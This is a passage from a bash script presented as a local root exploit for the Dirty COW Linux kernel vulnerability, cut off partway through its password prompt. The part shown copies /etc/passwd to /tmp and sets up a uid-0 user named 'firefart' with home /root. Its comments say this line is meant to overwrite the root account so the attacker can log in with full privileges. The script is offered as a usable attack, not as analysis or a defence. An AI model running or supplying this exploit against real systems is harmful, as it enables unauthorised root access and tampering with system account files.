#!/bin/bash

# This exploit uses the pokemon exploit of the dirtycow vulnerability
# as a base and automatically generates a new passwd line.
# The user will be prompted for the new password when the binary is run.
# The original /etc/passwd file is then backed up to /tmp/passwd.bak
# and overwrites the root account with the generated line.
# After running the exploit you should be able to login with the newly created user.

# Modify the user values according to your needs.
# The default is "firefart".

# Backup the original /etc/passwd
cp /etc/passwd /tmp/passwd.bak

# Set default values for user
USERNAME="firefart"
USERID=0
GROUPID=0
INFO="pwned"
HOMEDIR="/root"
SHELL="/bin/bash"
SALT="firefart"

# Prompt for the password or use argument if provided
if [ $# -ge 1 ]; then
  PASSWORD=$1
  echo "Passw
